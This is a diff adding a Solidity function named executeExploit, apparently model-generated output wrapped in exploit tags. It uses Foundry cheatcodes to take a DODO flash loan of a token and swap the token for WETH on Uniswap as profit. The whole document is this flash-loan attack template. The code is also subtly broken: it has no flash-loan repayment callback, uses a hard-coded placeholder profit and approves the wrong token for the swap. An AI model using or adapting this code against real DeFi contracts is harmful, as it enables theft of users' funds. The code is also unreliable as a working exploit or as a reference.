@@ -1,0 +1,37 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Start prank as the current contract
+    vm.startPrank(address(this), address(this));
+
+    // Obtain the WETH address and the current pair's reserves
+    IWETH weth = IWETH(uniswapRouter.WETH());
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken);
+    path[1] = address(weth);
+
+    // Approve the flashloan amount to the DPP contract
+    valuableToken.approve(address(flashloanProvider), amount);
+
+    // Call the flashloan function
+    IDODO(flashloanProvider).flashLoan(amount, 0, address(this), new bytes(0));
+
+    // Execute trading or token transfer after receiving the flashloan
+    uint256 profitableAmount = 1000 * 10 ** 18; // Example profit calculation
+    require(valuableToken.balanceOf(address(this)) >= profitableAmount, "Not enough tokens after trading");
+
+    // Swap tokens back to WETH using Uniswap
+    weth.approve(address(uniswapRouter), type(uint256).max);
+    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+        profitableAmount, 
+        0, // Accept any amount of WETH
+        path, 
+        address(this), 
+        block.timestamp + 300
+    );
+
+    // End prank and return to original state
+    vm.stopPrank();
+}
+</executeExploitCode>
+```
